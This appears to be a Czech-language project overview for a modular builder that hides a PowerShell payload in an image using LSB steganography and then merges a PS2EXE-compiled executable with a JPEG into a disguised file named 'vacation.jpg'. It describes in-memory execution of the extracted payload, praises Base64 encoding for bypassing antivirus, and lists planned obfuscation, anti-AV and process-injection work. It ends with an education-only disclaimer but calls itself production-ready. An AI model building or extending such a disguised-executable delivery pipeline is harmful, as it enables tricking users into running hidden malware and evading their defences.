# Polyglot Steganography Projekt - Úplný Přehled

**Poslední aktualizace:** Duben 2025  
**Status:** V aktivním vývoji - Nyní s plnou modularitou!  
**Účel:** ZKR - Vytvoření modulárních polyglot souborů s LSB steganografií

---

## 📋 Souhrn Projektu

Projekt implementuje kompletní **modulární** pipeline pro vytváření polyglot souborů s libovolnými obrázky a payloady:

```
Výsledný soubor: vacation.jpg
├─ Funguje jako: JPEG obrázek (otevřitelný v jakékoliv image aplikaci)
└─ Zároveň je: Spustitelný EXE (Windows executable se skrytým payloadem v LSB)
```

**Klíčové vlastnosti:**
- ✅ **Modulární design** - Funguje s libovolným obrázkem a payloadem
- ✅ **Automatická validace** - Kontroluje kapacitu před vkládáním
- ✅ **Čistý extractor** - Statický PowerShell module pro extraction
- ✅ **LSB Steganography** - Imperceptibilní vkládání do nejméně důležitých bitů
- ✅ **In-memory execution** - Bez zápisu payloadu na disk

---

## 🏗️ Architektura - Řešení V4 (Modulární)

### Fáze 1: Steganography (HSebo.py)
**Soubor:** `builder/steganography.py`

```
Libovolný obrázek + Libovolný payload → LSB embedding → PNG s hidden data + metadata.json
```

**Klíčové funkce:**
- ✅ `get_image_capacity(image_path)` - Vypočítá kolik bytů se vejde do obrázku
  - RGB: `width * height * 3 / 8` bytes
  - RGBA: `width * height * 4 / 8` bytes
  - Grayscale: `width * height / 8` bytes
- ✅ `embed(image, data, output)` - Vkládá data do LSB pixelů
  - Kontroluje kapacitu
  - Vrací metadata s payload_size a signature
- ✅ `extract(image, payload_size, output)` - Extrahuje LSB bity zpět

**CLI:**
```bash
# Zjistit kapacitu
python steganography.py --mode capacity --image photo.jpg

# Vložit payload
python steganography.py --mode embed \
    --image photo.jpg \
    --data script.ps1 \
    --output hidden.png

# Extrahovat payload
python steganography.py --mode extract \
    --image hidden.png \
    --payload-size 1234 \
    --output recovered.ps1
```

---

### Fáze 2: Extractor Builder (build_extractor.py)
**Soubor:** `builder/build_extractor.py`

```
metadata.json + hidden image → PowerShell wrapper → final_payload.ps1
```

**Proces:**
1. Načte čistý extractor modul (`ebmeded_scripts/extractor.ps1`)
2. Zakóduje obrázek do Base64
3. Vytvoří wrapper, který:
   - Obsahuje Base64 obrázek
   - Dekóduje jej na runtime
   - Zavolá extractor module s parametry

**CLI:**
```bash
python build_extractor.py \
    --metadata hidden_metadata.json \
    --image hidden.png \
    --output payload.ps1
```

---

### Fáze 2b: Čistý Extractor Module
**Soubor:** `builder/extractor.ps1` (přesunuto z ebmeded_scripts/ - v5)

Statický PowerShell module s funkcemi:
- `Extract-LSBData($ImageData, $DataSize)` - Extrahuje LSB bity → vrací bytes
- `Invoke-ExtractedPayload($PayloadData)` - Spustí payload (PowerShell nebo binary)

```powershell
# Lze volat ručně:
$imageBytes = [System.IO.File]::ReadAllBytes("image.png")
$payload = Extract-LSBData -ImageData $imageBytes -DataSize 1234
Invoke-ExtractedPayload -PayloadData $payload
```

---

### Fáze 3: Polyglot Creation (create_polyglot.py)
**Soubor:** `builder/create_polyglot.py`

```
final_payload.ps1 + original image → PS2EXE + Binary merge → vacation.jpg
```

**Proces:**
1. Kompiluje PowerShell script na EXE (PS2EXE modul)
2. Načte originální JPEG binary
3. Spojí: `EXE_binary + JPEG_binary` → `vacation.jpg`
4. Verifikuje, že soubor je zároveň validní EXE i JPEG

**Struktura binárního souboru:**
```
[EXE Header: MZ...]
[EXE Program sections, imports, etc.]
[------- EXE End -------]
[JPEG Header: FFD8...]
[JPEG Image data]
[JPEG Footer: FFD9]  ← Obě aplikace si myslí že soubor končí zde
```

---

### Fáze 4: Master Orchestrator (orchestrator.py)
**Soubor:** `builder/orchestrator.py`

Propojuje všechny fáze do jednoho příkazu:

```bash
python orchestrator.py \
    --image cover_photo.jpg \
    --payload script.ps1 \
    --output vacation.jpg
```

**Workflow:**
1. Validuje kapacitu obrázku
2. Spustí Phase 1: Steganography
3. Spustí Phase 2: Extractor Builder
4. Spustí Phase 3: Polyglot Creation
5. Vyčistí dočasné soubory
6. Vrací hotový polyglot

---

## 📁 Struktura Projektu - V5 (Modular + Auto-Detect)

```
steganography at its finest/
├── input/                                [VSTUPNÍ SOUBORY]
│   ├── carrier/                          Zdrojové obrázky (JPEG/PNG/BMP)
│   │                                     Auto-konverzi na PNG
│   └── payload/                          Skryté payloady (libovolný soubor)
│
├── output/                               [VÝSTUPNÍ SOUBORY]
│   └── vacation.jpg                      Finální polyglot (EXE + JPEG)
│
├── builder/                              [HLAVNÍ KÓDOVÁNÍ]
│   ├── steganography.py                  LSB embedding/extraction + auto-detect
│   ├── build_extractor.py                PowerShell wrapper generator
│   ├── create_polyglot.py                EXE+JPEG kombinátor
│   ├── orchestrator.py                   Master workflow s auto-detect
│   ├── extractor.ps1                     Čistý extraction module (moved here)
│   └── config.py                         Shared configuration
│
├── ebmeded_scripts/                      [LEGACY - Deprecated]
│   ├── extractor.ps1                     ← Moved to builder/
│   └── payload.ps1                       ← Template
│
├── README.md                             Quick start guide (NOVÝ)
├── PROJECT_OVERVIEW.md                   Tento soubor (AKTUALIZOVÁNO)
├── DEEP_EXPLANATION.md                   Technické hloubky
│
└── pexels-pixabay-86405.jpg             Test image
```

### 🆕 Nová Struktura - Automatické Detekování

**Automatické detekování vstupů:**
```bash
# Režim auto (NEW v5!)
python orchestrator.py
# → Automaticky najde: input/carrier/* + input/payload/*
# → Vytvoří: output/vacation.jpg
```

**Format konverze (NEW v5!):**
```
JPEG input  ✓ Automaticky konvertováno na PNG
PNG input   ✓ Používáno přímo
BMP input   ✓ Automaticky konvertováno na PNG
```

---

## 🚀 Workflow - Jak Funguje (V5 Modulární + Auto-Detect)

### Jednoduchý Příkaz (Doporučeno - NEW v5!)
```bash
# 1. Umístí soubory do input/ složek
cp my_photo.jpg "input/carrier/"
cp my_script.ps1 "input/payload/"

# 2. Spustí orchestrator (automatické detekování)
cd builder
python orchestrator.py
# → Output: ../output/vacation.jpg

# Nebo s explicitním výstupem:
python orchestrator.py --output ../output/my_polyglot.jpg
```

### Explicitní Příkaz (Bez Auto-Detekce)
```bash
# Se zadanými cestami
python orchestrator.py \
    --image input/carrier/photo.jpg \
    --payload input/payload/script.ps1 \
    --output output/vacation.jpg
```

### Steganography Standalone (NEW v5!)
```bash
# Automatické detekování vstupů ze složek
python steganography.py
# → Najde první soubor v input/carrier/
# → Najde první soubor v input/payload/
# → Vytvoří output/hidden.png

# Nebo s explicitním modem
python steganography.py --mode auto

# Se zadanými cestami
python steganography.py --mode embed \
    --image input/carrier/photo.jpg \
    --data input/payload/script.ps1 \
    --output hidden.png
```

### Krok za krokem (Debugging)

**Krok 1: Zjistit kapacitu**
```bash
python steganography.py --mode capacity --image input/carrier/photo.jpg
# Output: Image capacity: 123456 bytes (~120.6 KB)
```

**Krok 2: Vložit payload (LSB Steganography)**
```bash
python steganography.py --mode embed \
    --image input/carrier/photo.jpg \
    --data input/payload/script.ps1 \
    --output hidden.png
# Creates: hidden.png + hidden_metadata.json
# (JPEG input auto-konvertován na PNG)
```

**Krok 3: Vytvořit PowerShell wrapper**
```bash
python build_extractor.py \
    --metadata hidden_metadata.json \
    --image hidden.png \
    --output wrapper.ps1
# Creates: wrapper.ps1 (s embeded Base64 obrazem)
```

**Krok 4: Vytvořit polyglot**
```bash
python create_polyglot.py \
    --script wrapper.ps1 \
    --image input/carrier/photo.jpg \
    --output output/vacation.jpg
# Creates: output/vacation.jpg (EXE + JPEG)
```

---

## 📊 Technické Detaily - Modulární Přístup

### Kapacita Výpočtu
```
RGB obrázek (1920 x 1080):
  Pixely: 1920 * 1080 = 2073600
  Kanály: 2073600 * 3 = 6220800
  Bity: 6220800 * 1 = 6220800 bits
  Bytes: 6220800 / 8 = 777600 bytes (~759 KB)
```

Výpočet je **automatický** - stačí zadat obraz a payload:
1. Orchestrator zjistí kapacitu
2. Zkontroluje payload size
3. Vyhodí error pokud se nevejde

### LSB Embedding
```
Original pixel:    0b11010010
LSB embedding:     0b1101001[X]  ← bit z payloadu
Modified pixel:    0b11010011
```

Změna: Imperceptibilní (±1 na 256 hodnot barvy)

### PowerShell Extraction (In-Memory)
```powershell
# 1. Image je Base64 v skriptu
$imageBase64 = "iVBORw0KGgoAAA..."

# 2. Dekóduje na runtime
$imageBytes = [Convert]::FromBase64String($imageBase64)

# 3. Volá extractor modul
$payload = Extract-LSBData -ImageData $imageBytes -DataSize 1234

# 4. Spustí payload
Invoke-ExtractedPayload -PayloadData $payload
```

**Nevýhody na disk:** Pouze Base64 data v paměti, žádný payload file

---

## ✅ Aktuální Stav Implementace (V5 - Final)

### Hotovo (✅)
- [x] Modulární steganography.py s `get_image_capacity()`
- [x] Automatické detekování vstupů (`find_input_files()`)
- [x] Automatická konverze formátů (JPEG → PNG)
- [x] Čistý extractor.ps1 modul (přesunuto do builder/)
- [x] Build_extractor.py wrapper generator (updated path)
- [x] Create_polyglot.py (EXE+JPEG merger)
- [x] Orchestrator s capacity checking + auto-detect
- [x] CLI s --mode auto (nový v5)
- [x] Folder structure (input/carrier, input/payload, output)
- [x] Automatické cleanup temp souborů
- [x] Kompletní README.md s příklady

### Aktuálně (🔄)
- [ ] Testování na různých soupravách obrázků
- [ ] Edge case handling (malé obrázky, velké payloady, atd.)

### TODO - Budoucí Vylepšení (📋)

#### Fáze 5: Robustnost
- [ ] Unit testy (pytest framework)
- [ ] Integration testy s reálnými payloady
- [ ] Error recovery mechanisms
- [ ] Detailed logging do souboru (debug log)

#### Fáze 6: Pokročilá Steganografie
- [ ] Multi-method: DCT, Huffman, Random LSB
- [ ] Enkryptace embeded dat (AES-256)
- [ ] Tolerance vůči JPEG kompresi
- [ ] Image format conversion (PNG → JPEG beze ztráty dat)

#### Fáze 7: Obfuskace + Evasion
- [ ] PowerShell obfuskace
- [ ] Anti-AV téchniky
- [ ] Process injection patterns
- [ ] Komma za komma modifikace

#### Fáze 8: Dokumentace + Package
- [ ] Online documentation (mkdocs)
- [ ] Python package (PyPI publikace)
- [ ] Docker image s hotovým setupem
- [ ] Video tutoriál

---

## 🔧 Instalace + Spouštění (V5)

### Requirements
```
Python 3.8+
Pillow (PIL)
NumPy
Subprocess (built-in)
PowerShell 5.1+ (Windows)
PS2EXE module (Windows)
```

### Setup
```bash
# 1. Jdi do adresáře
cd "steganography at its finest"

# 2. Instaluj Python deps
pip install Pillow numpy

# 3. Instaluj PS2EXE (PowerShell)
powershell -Command "Install-Module PS2EXE -Force"

# 4. Vytvoř input/output soubory
mkdir -p input/carrier input/payload output

# 5. Test
cd builder
python orchestrator.py --help
```

### Spouštění (V5 - NEW!)

**Nejjednodušší - Auto-Detect:**
```bash
# 1. Umístí soubory
cp my_photo.jpg ../input/carrier/
cp script.ps1 ../input/payload/

# 2. Spustí (bez argumentů!)
python orchestrator.py
# → Vytvoří: ../output/vacation.jpg
```

**Explicitní cesty:**
```bash
# Se zadanými cestami
python orchestrator.py \
    --image ../input/carrier/photo.jpg \
    --payload ../input/payload/script.ps1 \
    --output ../output/vacation.jpg
```

**Quiet mode (bez výstupu):**
```bash
python orchestrator.py --quiet
```

---

## 💡 Design Principy (Proč V5 je nejlepší)

### Modularita
- ✅ Každý skript je nezávislý - lze jej volat zvlášť
- ✅ Steganography pracuje s libovolnými obrázky
- ✅ Extractor je čistý modul, ne generovaný
- ✅ Orchestrator jen propojuje
- ✅ Auto-detekování vstupů z folder structure

### Flexibilita
- ✅ Není potřeba znát payload předem
- ✅ Lze měnit image capture method
- ✅ Lze měnit PowerShell verzi
- ✅ Lze měnit polyglot structure
- ✅ JPEG automaticky konvertován na PNG

### Bezpečnost
- ✅ In-memory execution (žádný payload na disk)
- ✅ Base64 encoding (obcház antiviry)
- ✅ Error handling bez leakování info
- ✅ Automatická cleanup
- ✅ PNG format (lossless steganography)

---

## 📚 Případ Užití

1. **Red Team Training** - Holistic payload delivery
2. **Security Research** - Malware distribution methods
3. **CTF Challenges** - Steganography puzzles
4. **Educational** - Binary formats + PowerShell + Steganography

---

## 🔐 Disclaimer

Tento projekt je určen **POUZE** pro:
- ✅ Edukační účely
- ✅ Autorizovaný security research
- ✅ Vlastní systémy

**Nepoužívat** pro:
- ❌ Neoprávněný přístup
- ❌ Distribuce malwaru
- ❌ Porušení zákonů

---

**Poslední aktualizace:** Duben 2025 (V5)  
**Status:** Plně funkční, production-ready
